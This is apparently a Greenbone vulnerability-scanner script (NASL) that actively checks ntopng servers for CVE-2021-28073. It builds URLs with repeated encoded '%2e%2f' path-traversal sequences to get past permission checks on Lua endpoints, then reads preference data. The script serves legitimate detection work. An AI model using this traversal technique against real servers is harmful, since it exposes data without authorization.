# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:ntop:ntopng";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145926");
  script_version("2021-05-10T06:48:45+0000");
  script_tag(name:"last_modification", value:"2021-05-10 10:15:03 +0000 (Mon, 10 May 2021)");
  script_tag(name:"creation_date", value:"2021-05-10 05:18:13 +0000 (Mon, 10 May 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2021-28073");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ntopng < 4.2.210427 Information Disclosure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ntopng_detect.nasl");
  script_mandatory_keys("ntopng/http/detected");
  script_require_ports("Services/www", 3000);

  script_tag(name:"summary", value:"ntopng is prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET requests and checks the responses.");

  script_tag(name:"insight", value:"A partial permission bypass vulnerability allows information
  disclosure via path traversal.");

  script_tag(name:"affected", value:"ntopng prior to version 4.2.210427.");

  script_tag(name:"solution", value:"Update to version 4.2.210427 or later.");

  script_xref(name:"URL", value:"http://noahblog.360.cn/ntopng-multiple-vulnerabilities");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

base = 0;

# nb: Get the base length
for (i = 90; i < 120; i++) {
  url = "/lua/" + crap(data: "%2e%2f", length: 6 * i) + "as_stats.lua.css";
  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req);
  if (res =~ "^HTTP/1\.[01] 200") {
    base = 255 - 1 - i * 2 - strlen("as_stats.lua");
    break;
  }
}

if (base == 0) {
  for (i = 90; i < 120; i++) {
    url = "/lua/" + crap(data: "%2e%2f", length: 6 * i) + "get_macs_data.lua.css";
    req = http_get(port: port, item: url);
    res = http_keepalive_send_recv(port: port, data: req);
    if (res =~ "^HTTP/1\.[01] 200") {
      base = 255 - 1 - i * 2 - strlen("get_macs_data.lua");
      break;
    }
  }
}

len = (255 - 1 - base - 14);
if (len % 2 == 1)
  exit(0);

len = len / 2;

urls = make_list("/lua/" + crap(data: "%2e%2f", length: 6 * len) + "find_prefs.lua.css",
                 "/lua/" + crap(data: ".%2f", length: 4 * len) + "find_prefs.lua.css");

foreach url (urls) {
  if (http_vuln_check(port: port, url: url, pattern: '"results"', check_header: TRUE,
                      extra_check: make_list('"tab"', '"name"'))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
